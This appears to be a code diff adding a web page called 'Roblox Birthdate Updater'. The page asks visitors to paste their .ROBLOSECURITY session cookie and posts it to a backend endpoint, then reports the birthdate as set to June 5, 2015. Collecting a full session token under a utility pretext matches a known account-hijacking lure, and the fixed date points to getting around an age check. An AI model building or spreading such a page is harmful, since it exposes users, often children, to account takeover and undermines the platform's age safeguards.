@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox Birthdate Updater</title>
+  <style>
+    body {
+      background: #000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+    }
+    input {
+      background: #111;
+      border: 2px solid #0ff;
+      color: #0ff;
+      padding: 10px;
+      border-radius: 8px;
+      width: 300px;
+      font-size: 16px;
+      outline: none;
+      box-shadow: 0 0 10px #0ff, 0 0 20px #0ff inset;
+    }
+    button {
+      margin-top: 15px;
+      background: #111;
+      border: 2px solid #f0f;
+      color: #f0f;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #f0f, 0 0 20px #f0f inset;
+    }
+    button:hover {
+      background: #222;
+      box-shadow: 0 0 20px #f0f, 0 0 30px #f0f inset;
+    }
+    #result {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .success {
+      color: #0f0;
+      text-shadow: 0 0 10px #0f0;
+    }
+    .error {
+      color: #f00;
+      text-shadow: 0 0 10px #f00;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 style="color:#0ff;text-shadow:0 0 10px #0ff;">Update Roblox Birthdate</h1>
+    <input id="cookie" type="text" placeholder="Enter .ROBLOSECURITY cookie" />
+    <br>
+    <button onclick="updateBirthdate()">Submit</button>
+    <div id="result"></div>
+  </div>
+
+  <script>
+    async function updateBirthdate() {
+      const cookie = document.getElementById("cookie").value;
+      const resultEl = document.getElementById("result");
+      resultEl.textContent = "⏳ Processing...";
+      resultEl.className = "";
+
+      const res = await fetch("/api/update", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookie })
+      });
+      const data = await res.json();
+
+      if (res.ok) {
+        resultEl.textContent = "🎉 Your birthday is now verified as June 5, 2015!";
+        resultEl.className = "success";
+      } else {
+        resultEl.textContent = "❌ Failed: " + (data.error || data.response || "Unknown error");
+        resultEl.className = "error";
+      }
+    }
+  </script>
+</body>
+</html>
